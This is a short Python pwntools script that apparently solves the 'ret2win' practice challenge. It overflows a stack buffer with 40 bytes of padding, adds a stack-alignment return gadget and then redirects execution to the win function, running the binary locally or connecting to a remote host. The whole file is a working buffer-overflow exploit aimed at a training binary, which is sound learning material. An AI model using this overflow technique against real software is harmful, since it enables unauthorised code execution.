from pwn import * 

binary = './ret2win'

pwn_ret = 0xffda68

ret2win_addr = 0x400756

padding = b"a" * 40 # the read function reads 56 bytes

payload = padding
payload += b"\x55\x07\x40\x00\x00\x00\x00\x00" # random ret instruction to align the stack (idk what that means exactly)
payload += p64(ret2win_addr)


DEBUG = True

if DEBUG:
    io = process(binary)
else:
    io = remote(address, port)


print(io.recv())
io.sendline(payload)
print(io.recvline())
print(io.recvline())
print(io.recvline())
